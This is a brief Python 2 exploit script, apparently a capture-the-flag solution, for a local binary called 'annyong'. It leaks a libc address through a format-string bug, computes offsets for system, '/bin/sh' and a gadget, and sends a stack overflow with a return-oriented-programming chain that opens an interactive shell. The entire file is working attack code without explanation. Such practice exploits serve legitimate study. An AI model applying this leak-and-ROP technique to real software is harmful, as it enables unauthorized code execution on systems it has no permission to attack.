#!/usr/bin/env python2

# this script only works in my environment
# just to show an example how to pwn it

import os, sys, subprocess, time, struct
from subprocess import *

fmt = '%%%d$llx'

def pk(i):
    return struct.pack('<Q', i)

p = Popen(['./annyong'], stdin = PIPE, stdout = PIPE)

p.stdin.write(fmt % 267 + '\n')
libc245 = int(p.stdout.readline()[:-1], 16)
base = libc245 - 245 - 0x21920
print 'base =', base
system = base + 0x41520
binsh = base + 1456714
gadget = base + 0x22262


raw_input('enter to write')

p.stdin.write('A' * (0x810 + 8) + pk(gadget) + pk(binsh) + pk(system) + '\n')
#print p.stdout.readline()

while True:
    p.stdin.write(raw_input() + '\n')
    print p.stdout.readline()

